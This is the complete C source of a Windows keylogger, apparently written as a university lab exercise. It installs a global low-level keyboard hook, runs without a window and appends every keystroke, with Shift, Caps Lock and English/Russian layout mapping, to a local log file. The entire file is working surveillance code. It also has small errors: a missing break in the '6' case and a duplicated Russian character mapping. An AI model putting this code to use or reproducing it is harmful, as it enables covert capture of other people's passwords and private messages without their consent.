#include <Windows.h>
#include <malloc.h>
#include <locale.h>
#include <string.h>
#include <stdio.h>

#define SIZE_STR 1 << 8 // размер строки 2^8 = 256 символов
#define PATH L"D:\\Точка входа\\Университет\\3 курс 2 семестр\\Unix-операційні системи\\Лабы\\3\\HOOK\\key.log"

// раскладка клавиатуры
#define RUS 0x0419
#define ENG 0x0409

BOOL IsCaps(void); // нажат CAPSLOCK или SHIFT ?
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam); // перехват данных
VOID WriteToFile(LPWSTR wstr); // запись в файл

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	// создаем Handle Hook 
	// WH_KEYBOARD_LL означает, что хук будет перехватывать клавиатуру
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKey, NULL, NULL);

	// бесконечный цикл
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		// получение и обработка сообщения
		// с которым ничего не происходит
		// не перенагружает систему 
		// в отличии от обычного бесконечного цикла
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// закрываем хук
	UnhookWindowsHookEx(hHook);

	return 0;
}

// Функция определения того, находимся ли мы сейчас в верхнем регистре или нет
BOOL IsCaps(void)
{
	// GetKeyState используеться в основном для определения состояния нажатия системной кнопки
	// VK - Virtual Key
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN) // пользователь нажал на какую-то кнопку
	{
		// храним метаданные связанные с кнопкой
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		// получаем индекс кнопки
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5)) // 32
			iKey |= 0x1 << 24; //Задаём истину для 24 бита
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		// по индексу кнопки получаем название кнопки
		// все названия кнопок в верхнем регистре
		GetKeyNameText(iKey, wstr, SIZE_STR);

		if (wcslen(wstr) > 1) //Если это служебная кнопка
		{
			WriteToFile(L"[");
			WriteToFile(wstr);
			WriteToFile(L"]");
		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '1':
					WriteToFile(L"!");
					break;
				case '2':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"@");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"\"");
					break;
				case '3':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"#");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"№");
					break;
				case '4':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"$");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L";");
					break;
				case '5':
					WriteToFile(L"%");
					break;
				case '6':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"^");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L":");
				case '7':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"&");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"?");
					break;
				case '8':
					WriteToFile(L"*");
					break;
				case '9':
					WriteToFile(L"(");
					break;
				case '0':
					WriteToFile(L")");
					break;
				case '-':
					WriteToFile(L"_");
					break;
				case '=':
					WriteToFile(L"+");
					break;
				case '[':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"{");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Х");
					break;
				case ']':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"}");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Ъ");
					break;
				case ';':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L":");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Ж");
					break;
				case '\'':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"\"");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Ж");
					break;
				case ',':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"<");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Б");
					break;
				case '.':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L">");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Ю");
					break;
				case '/':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"?");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L",");
					break;
				case '\\':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"|");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"/");
					break;
				case '`':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(L"~");
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(L"Ё");
					break;
				default:
					WriteToFile(wstr);
					break;
				}

			}
			else
			{
				wstr[0] = tolower(wstr[0]);
				WriteToFile(wstr);
			}
		}
		free(wstr); // очищаем строку
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}